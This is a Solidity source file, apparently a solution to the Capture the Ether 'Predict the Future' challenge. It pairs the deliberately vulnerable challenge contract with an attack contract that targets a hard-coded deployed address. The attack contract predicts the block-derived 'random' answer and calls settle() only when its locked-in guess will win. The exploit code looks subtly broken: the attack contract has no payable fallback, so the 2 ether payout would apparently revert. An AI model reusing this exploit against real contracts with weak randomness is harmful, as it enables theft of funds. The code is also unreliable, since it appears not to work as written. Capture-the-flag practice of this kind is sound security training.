/**
 *Submitted for verification at Etherscan.io on 2022-01-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Sol {
    PredictTheFutureChallenge pt = PredictTheFutureChallenge(0xCD13E87ff53b88a15dBCec104B1869A3749bE2A1);

    function prepare() public payable {
        require(msg.value == 1 ether);
        pt.lockInGuess.value(msg.value)(3);
    }

    function attack() public {
        require(3 == (uint8(keccak256(block.blockhash(block.number - 1), now)) % 10));
        pt.settle();
        selfdestruct(msg.sender);
    }
}